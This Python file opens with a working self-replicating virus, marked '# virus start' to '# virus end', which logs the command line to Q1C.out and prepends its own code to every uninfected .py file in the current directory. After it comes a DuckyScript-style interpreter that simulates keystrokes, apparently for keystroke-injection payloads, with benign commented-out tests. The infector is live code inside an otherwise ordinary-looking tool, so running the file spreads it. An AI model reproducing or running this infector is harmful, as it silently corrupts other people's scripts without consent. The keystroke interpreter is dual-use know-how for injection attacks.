# virus start
import sys, glob
def file_finder(directory="."):
	return[file for file in glob.glob("*.py")]
def file_content(filename):
	info = None
	with open(filename, "r") as file:
		info = file.readlines()
	return info
def infectable(filename):
	info = file_content(filename)
	for line in info:
		if "# virus start\n" in line:
			return None
	return info
def virus_infect(filename, code):
	if (data:=infectable(filename)):
		with open(filename, "w") as infect_file:
			infect_file.write("".join(code))
			infect_file.writelines(data)
def code():
	extract = False
	virus = []
	text = file_content(__file__)
	for line in text:
		if "# virus start\n" in line:
			extract = True
		if extract:
			virus.append(line)
		if "# virus end\n" in line:
			extract = False
			break
	return virus
def append_file(line):
	output = "Q1C.out"
	with open(output, 'a') as x:
		x.write(line + '\n')
def infection():
	line = " ".join(sys.argv)
	append_file(line)
	c = code()
	for files in file_finder():
		virus_infect(files, c)
if __name__ == "__main__":
	infection()
# virus end
from validation import LineCheck
from time import sleep
from inputSimulator import SimulateKeyPress, SimulateModifiedKeyStroke, SimulateTextEntry

defaultDelay = False
defaultDelayValue = 0
lastCommand = ""
lastKey = ""
isCapsEnabled = False

def SetDelay(delay:int):
    global defaultDelay
    global defaultDelayValue

    if delay > 1:
        defaultDelay = True
    defaultDelayValue = delay

def ReadFile(filePath:str):
    f = open(filePath)
    duckyFile = f.read().splitlines()
    f.close()

    for line in duckyFile:
        Calculate(line)

def Calculate(line:str):
    command, keys = ProcessLine(line)
    KeyboardAction(command, keys)

def CheckDefaultSleep():
    if defaultDelay:
        sleep(defaultDelayValue / 1000.0)

def SetLastCommand(command:str, keys:str):
    global lastCommand
    global lastKey
    lastCommand, lastKey = command, keys

def ValidateCode(filePath : str):
    f = open(filePath)
    duckyFile = f.read().splitlines()
    f.close()

    for num, line in enumerate(duckyFile):
        command, keys = ProcessLine(line)
        result = LineCheck(command, keys, num+1)
        if not result:
            return False
    return True

def KeyboardAction(command:str, keys:str):
    global defaultDelay
    global defaultDelayValue
    global isCapsEnabled
    keyboardKey = keys.upper()

    try:
        match command:
            case "DEFAULT_DELAY" | "DEFAULTDELAY":
                defaultDelay = True
                defaultDelayValue += int(keys)
            case "DELAY":
                CheckDefaultSleep()
                sleep(int(keys) / 1000.0)
            case "STRING":
                CheckDefaultSleep()
                if isCapsEnabled:
                    SimulateTextEntry(keys.upper())
                else:
                    SimulateTextEntry(keys)
            case "WINDOWS" | "GUI" | "ENTER" | "APP" | "MENU" | "SHIFT" | "ALT" | "CONTROL" | "CTRL":
                CheckDefaultSleep()
                SimulateModifiedKeyStroke(command, keys)
            case "TAB" | "DELETE" | "SPACE" | "DOWNARROW" | "DOWN" | "LEFTARROW" | "LEFT" | "RIGHTARROW" | "RIGHT" | "UPARROW" | "UP":
                CheckDefaultSleep()
                SimulateKeyPress(command)
            case "REPLAY":
                CheckDefaultSleep()
                for _ in range(int(keys)):
                    KeyboardAction(lastCommand, lastKey)
            case "CAPS":
                CheckDefaultSleep()
                isCapsEnabled = not isCapsEnabled
    except Exception as e:
        print(e)
    if command != "REPLAY" and command != "REM":
        SetLastCommand(command, keys)

def ProcessLine(line):
    words = line.split(' ')
    command = words[0]
    keys = ""
    flag = 0
    for word in words[1:]:
        if flag == 0:
            keys += word
            flag += 1
        else:
            keys += " " + word
    return command, keys


# Testing
if __name__ == "__main__":
    '''KeyboardAction("DEFAULT_DELAY", "100")
    KeyboardAction("STRING", "I am a bumbling fool")
    KeyboardAction("WINDOWS", "")
    KeyboardAction("DELAY", "1000")
    KeyboardAction("WINDOWS", "")
    KeyboardAction("ENTER", "")

    KeyboardAction("SHIFT", "GUI")
    KeyboardAction("SHIFT", "UPARROW")
    KeyboardAction("REPLAY", "5")
    KeyboardAction("SHIFT", "DOWNARROW")
    KeyboardAction("SHIFT", "LEFTARROW")
    KeyboardAction("SHIFT", "RIGHTARROW")
    KeyboardAction("SHIFT", "p")
    ''' # This much is confirmed to work correctly

    ValidateCode("helloworld.txt")